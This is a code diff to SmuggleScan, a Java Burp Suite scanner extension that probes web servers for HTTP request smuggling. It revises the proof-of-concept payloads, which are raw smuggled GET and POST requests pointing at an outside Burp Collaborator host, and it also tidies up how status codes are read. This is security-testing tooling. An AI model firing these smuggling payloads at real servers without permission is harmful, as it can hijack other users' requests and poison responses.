@@ -97,9 +97,12 @@ public class SmuggleScan extends Scan implements IScannerCheck  {
 
     boolean sendPoc(byte[] base, IHttpService service) {
         boolean gpoc = sendPoc(base, service, "G", "G");
-        //boolean cpoc = sendPoc(base, service,"GET / HTTP/1.1\r\nHost: "+service.getHost()+".cvbzu8x774fh9miyfwvb30jgf7lx9m.burpcollaborator.net\r\n\r\n");
-        boolean cpoc = sendPoc(base, service, "collab", "GET /cvbzu8x774fh9miyfwvb30jgf7lx9m/"+service.getHost()+" HTTP/1.1\r\nHost: 52.16.21.24\r\n\r\n");
-        return gpoc || cpoc;
+        //boolean cpoc = sendPoc(base, service,"GET / HTTP/1.1\r\nHost: "+service.getHost()+".z88m811soo7x6fxuo08vu4wd94fw3l.burpcollaborator.net\r\n\r\n");
+        //boolean cpoc = sendPoc(base, service, "collab", "GET /z88m811soo7x6fxuo08vu4wd94fw3l/"+service.getHost()+" HTTP/1.1\r\nHost: 52.16.21.24\r\n\r\n");
+        boolean cpoc2 = sendPoc(base, service, "collab", "GET /z88m811soo7x6fxuo08vu4wd94fw3l/"+service.getHost()+" HTTP/1.1\r\nHost: 52.16.21.24\r\nFoo: x");
+        boolean cpoc3 = sendPoc(base, service, "collab", "POST /z88m811soo7x6fxuo08vu4wd94fw3l/"+service.getHost()+" HTTP/1.1\r\nHost: 52.16.21.24\r\nContent-Length: 8\r\n\r\nfoo=");
+
+        return gpoc || cpoc2 || cpoc3;
     }
 
     boolean sendPoc(byte[] base, IHttpService service, String name, String inject) {
@@ -123,9 +126,9 @@ public class SmuggleScan extends Scan implements IScannerCheck  {
                     break;
                 }
             }
-            short cleanupStatus = cleanup.getInfo().getStatusCode();
-            short minerStatus = results.get(0).getInfo().getStatusCode();
-            short victimStatus = results.get(1).getInfo().getStatusCode();
+            short cleanupStatus = cleanup.getStatus();
+            short minerStatus = results.get(0).getStatus();
+            short victimStatus = results.get(1).getStatus();
 
             if (cleanupStatus == minerStatus && minerStatus == victimStatus) {
                 return false;
@@ -237,18 +240,15 @@ public class SmuggleScan extends Scan implements IScannerCheck  {
                 return null;
             }
 
-            if (badChunkResp.getInfo().getStatusCode() == syncedResp.getInfo().getStatusCode()) {
+            if (badChunkResp.getStatus() == syncedResp.getStatus()) {
                 Utilities.log("Invalid chunk probe didn't do anything. Attempting overlong chunk timeout instead.");
 
                 byte[] overlongChunk = makeChunked(original, 0, 1); //Utilities.setBody(baseReq, "1\r\n\r\n");
                 Resp overlongChunkResp = request(service, overlongChunk);
 
-                short overlongChunkCode = 0;
-                if (!overlongChunkResp.timedOut()) {
-                    overlongChunkCode = overlongLengthResp.getInfo().getStatusCode();
-                }
+                short overlongChunkCode = overlongChunkResp.getStatus();
 
-                if (overlongChunkCode == syncedResp.getInfo().getStatusCode() || overlongChunkCode == overlongLengthCode) {
+                if (overlongChunkCode == syncedResp.getStatus() || overlongChunkCode == overlongLengthCode) {
                     Utilities.log("Invalid chunk and overlong chunk both had no effect. Aborting.");
                     return null;
                 }
